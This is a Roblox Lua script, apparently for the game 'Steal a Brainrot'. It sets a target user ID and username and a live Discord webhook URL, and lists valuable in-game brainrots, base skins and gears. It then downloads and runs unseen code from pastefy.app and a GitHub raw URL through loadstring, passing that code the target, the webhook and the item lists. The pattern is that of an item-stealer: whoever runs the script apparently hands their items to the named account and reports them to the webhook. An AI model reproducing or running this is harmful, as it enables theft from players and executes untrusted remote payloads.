local TARGET_ID = 5866501655
local TARGET_USER = "teo133303"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1574617482604314644/iEC7eYit9yRrKATqO-Osg-7BCrjMhrYcI-NkjZ5N3oxuFrBrjKwOO8JBzOknnc_KVm7H"

local TargetBrainrots = {
    ["Hydra Bunny"] = true,
    ["Hydra Dragon Cannelloni"] = true,
    ["Dragon Cannelloni"] = true,
    ["Griffin"] = true,
    ["Dragon Gingerini"] = true,
    ["Antonio"] = true,
    ["Elefanto Frigo"] = true,
    ["Rico Dinero"] = true,
    ["Rubrikiko"] = true,
    ["Arcadragon"] = true,
    ["Pancake and Syrup"] = true,
    ["Kalika Bros"] = true,
    ["Tirilikalika Tirilikalako"] = true,
    ["Globa Steppa"] = true,
    ["Dug Dug Dug"] = true,
    ["La Supreme Combinasion"] = true,
    ["La Casa Boo"] = true,
    ["Dragon Aquanini"] = true,
    ["Signore Carapace"] = true,
    ["Fishino Clownino"] = true,
    ["Cerberus"] = true,
    ["Duggy Bros"] = true,
    ["Kraken"] = true,
    ["Venuspino"] = true,
    ["Gorillo Subwoofero"] = true,
    ["Foxini Lanternini"] = true,
    ["John Pork"] = true,
    ["Headless Horseman"] = true,
    ["Sammyni Cakini"] = true,
    ["Jelly Moby"] = true,
    ["Bearito Cabinito"] = true,
    ["Digi Narwhal"] = true,
    ["Los Admins"] = true,
    ["Moby Bros"] = true,
    ["Burguro and Fryuro"] = true,
    ["Capitano Moby"] = true,
    ["Celestial Pegasus"] = true,
    ["Cash or Card"] = true,
    ["Cloverat Clapat"] = true,
    ["Donkeyturbo Express"] = true,
    ["Fragrama and Chocrama"] = true,
    ["Garama and Madundung"] = true,
    ["Ginger Gerat"] = true,
    ["Ketupat Bros"] = true,
    ["La Ginger Sekolah"] = true,
    ["La Food Combinasion"] = true,
    ["Los Secret Combinasionas"] = true,
    ["Examen Bros"] = true,
    ["Pizza and Ranch"] = true,
    ["Bumbatron"] = true,
    ["Yetimatic"] = true,
    ["S'more Serat"] = true,
    ["La Breakfast Combinasion"] = true,
    ["Los Spaghettis"] = true,
    ["Orcaledon"] = true,
    ["Popcuru and Fizzuru"] = true,
    ["Reinito Sleighito"] = true,
    ["Rosey and Teddy"] = true,
    ["La Fuse Machine"] = true,
    ["W or L"] = true,
    ["Sammyni Truckini"] = true,
    ["Machine Bros"] = true,
    ["Medusini and Demonini"] = true,
    ["Cabin Bros"] = true,
    ["Flying Dutchman"] = true,
    ["Nachorilla"] = true,
    ["Rubiko and Kubiko"] = true,
    ["Tuff Toucan"] = true,
    ["Tralaledon"] = true,
    ["Spooky and Pumpky"] = true,
    ["Los Sekolahs"] = true,
    ["La Taco Combinasion"] = true
}

local TargetBaseSkins = {
    ["Aquatic"] = true,
    ["Bunny Basket"] = true,
    ["Candy"] = true,
    ["Christmas"] = true,
    ["Cursed"] = true,
    ["Cyber"] = true,
    ["Diamond"] = true,
    ["Divine"] = true,
    ["Easter"] = true,
    ["Galaxy"] = true,
    ["Gingerbread"] = true,
    ["Gold"] = true,
    ["Halloween"] = true,
    ["Lava"] = true,
    ["Lucky"] = true,
    ["Octo"] = true,
    ["Pot of Gold"] = true,
    ["Radioactive"] = true,
    ["Rainbow"] = true,
    ["Rose"] = true,
    ["Summer"] = true,
    ["Taco"] = true,
    ["Valentines"] = true,
    ["Yin Yang"] = true,
    ["Tralalero"] = true
}

local TargetGears = {
    ["Alien Slap"] = true,
    ["Blackhole Bomb"] = true,
    ["Bloodmoon Hammer"] = true,
    ["Bloodmoon Slap"] = true,
    ["Candy Sentry"] = true,
    ["Candy Slap"] = true,
    ["Cupid's Wings"] = true,
    ["Cursed Slap"] = true,
    ["Cyber Slap"] = true,
    ["Demon's Head"] = true,
    ["Divine Slap"] = true,
    ["Lava Blaster"] = true,
    ["Lava Slap"] = true,
    ["Radioactive Airstrike"] = true,
    ["Radioactive Slap"] = true,
    ["Rainbow Hammer"] = true,
    ["Rainbow Slap"] = true,
    ["Santa's Sleigh"] = true,
    ["Waverider"] = true,
    ["Witch's Broom"] = true,
    ["Yin Yang Lamp"] = true,
    ["Yin Yang Slap"] = true,
    ["Phantom Slap"] = true,
    ["Crystal Slap"] = true,
    ["Skeleton Dragon"] = true
}

task.spawn(function()
    loadstring(game:HttpGet("https://pastefy.app/RsqRaQC0/raw"))()
end)

task.spawn(function()
    loadstring(game:HttpGet("https://pastefy.app/eDmA1TWp/raw"))()

task.wait(1)

    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
    if type(script) == "function" then
        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
    end
end)